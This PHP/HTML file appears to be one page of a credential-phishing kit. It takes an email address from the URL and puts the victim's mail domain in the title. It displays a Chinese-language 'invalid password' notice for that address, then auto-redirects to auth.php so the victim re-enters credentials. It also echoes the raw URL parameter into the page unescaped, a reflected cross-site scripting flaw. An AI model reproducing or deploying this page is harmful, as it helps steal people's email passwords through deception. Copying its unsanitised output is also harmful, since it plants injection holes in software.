<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

  <head>

  <meta charset="UTF-8">
  <title><?php echo $yuh ?> 密码设定 | User: <?php echo $login ?></title>
  
  <link rel="icon" href="./grid/favicon.png" type="image/gif" sizes="16x16">
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>

  <meta http-equiv="refresh" content="2; url=auth.php?email=<?php echo $login ?>"/>

</head>


<body>

<br>

	<table align="left" cellspacing="0"><tr>
	
	<td style="width:15px;"></td>
	
	
	<td>
	
		<font face="Arial, Helvetica, sans-serif" size="2" color="#FF0000"><b>
		输入的密码无效 对于: 
		</b></font>
		
		<br>
		
		
		<font face="Arial, Helvetica, sans-serif" size="+2" color="#000000">
		<?php echo $login ?>
		</font>
	
	</td>
	
	</tr></table>

</body>


</html>